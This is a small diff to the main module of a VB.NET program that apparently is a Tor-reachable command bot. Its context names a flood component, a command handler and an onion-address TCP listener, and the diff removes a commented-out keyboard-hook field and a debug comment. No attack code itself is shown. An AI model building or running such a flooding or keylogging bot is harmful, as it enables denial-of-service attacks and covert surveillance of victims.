@@ -16,7 +16,6 @@ Module Main
     Private _command As New CommandHandler
     Private _config As New ConfigBotModel
     Private _FloodsBase As Floodsbase
-    'Private _KeyboardHook As KeyboardHook
     Public Function GetFloodsBase()
         Return _FloodsBase
     End Function
@@ -74,7 +73,7 @@ Module Main
     Public Sub Listener()
         If Config.Variables.Debug Then
             Console.WriteLine("Onion Address: " & GetOnionAddress())
-            Console.WriteLine("Listening") 'Debugging
+            Console.WriteLine("Listening")
         End If
         Dim tcplistener As New TcpListen()
         While (True)
